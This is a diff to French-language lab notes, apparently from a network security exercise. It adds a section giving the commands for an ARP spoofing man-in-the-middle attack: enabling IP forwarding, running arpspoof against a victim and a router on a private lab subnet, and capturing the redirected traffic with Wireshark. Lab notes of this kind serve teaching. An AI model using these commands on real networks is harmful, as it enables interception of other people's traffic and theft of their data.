@@ -107,8 +107,25 @@ openssl enc -aes-256-cbc -K KEY -iv IV -d -in encrypted_file.enc -out decrypted.
 
 ## 4
 
+```
+# Lancer kali linux et mettre dans la conf une IP statique et la gateway 192.168.2.1 (IP routeur)
+ip -c a && ping -c 1 192.168.2.1 && ping -c 1 192.168.2.2
+# Rediriger le trafic entre les deux victimes :
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# Terminal 1 : (spoof vers la victime)
+sudo arpspoof -i eth0 -t 192.168.2.2 192.168.2.1
+# Terminal 2 : (spoof vers le routeur, il croit que kali est la victime)
+sudo arpspoof -i eth0 -t 192.168.2.1 192.168.2.2
+# Laisser les deux commandes en parralèle et lancer wireshark
+# Lancer aussi la commande suivante et attendre d'avoir les deux lignes (les deux IPs pointent vers la m^me @MAC)
+arp -a
+```
 
+## 5
 
+```
+
+```
 
 
 
